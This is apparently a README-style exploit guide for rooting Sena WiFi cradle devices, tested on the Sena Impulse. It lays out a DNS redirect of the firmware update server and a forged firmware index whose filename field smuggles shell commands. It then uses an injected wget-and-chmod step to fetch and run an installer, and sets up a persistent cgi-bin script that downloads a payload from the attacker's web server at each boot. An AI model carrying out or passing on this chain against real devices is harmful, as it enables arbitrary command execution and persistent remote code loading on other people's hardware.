# PWNing the Sena Wifi Cradle and its Derivatives
### (as tested on the Sena Impulse Wifi update part)

IMPORTANT: Make sure all text files got unix linefeeds

## Initial entering&PWNing (Sena Impulse):
* Doing a local DNS redirect of ```firmware.sena.com``` to your own LAN ip.
* Create a folder ```senabluetoothmanager```.
* Create a folder ```WiFiCradle/impulse```
* Create a file check.cdat with following content:

    SENA

(yes, the linefeed at the end matters)
* Download firmware.sena.com/senabluetoothmanager/Firmware and save it at the same folder on your local server.
* Replace the filename after the last colon on Lines containing ```Impulse-v1.*.img``` with ```I";any_command_here```.  
That line change allows injection of arbitrary commands.
* Connect the Sena Impluse to the WiFi via the app or via manually doing the app commands.
## Getting Persistence
* copy the provided install.sh and PWNa.zip to the root directory of your server.
* rename install.sh to index.html (needed to bypass a quirk)
* In the Firmware index file replace the filename after the last colon on Lines containing ```Impulse-v1.*.img``` with ```I";wget firmware.sena.com;chmod +x index.html```.
* Trigger a firmware update. It will seemingly succeed or "fail". Instead it ran the injected command.
* open https://IP_OF_SENA_IMPULSE/cgi-bin/index.html to install the persistence.
* Reboot and you got a file under https://IP_OF_SENA_IMPULSE/cgi-bin/exploit.sh which downloads a payload.sh from the root of your webserver.
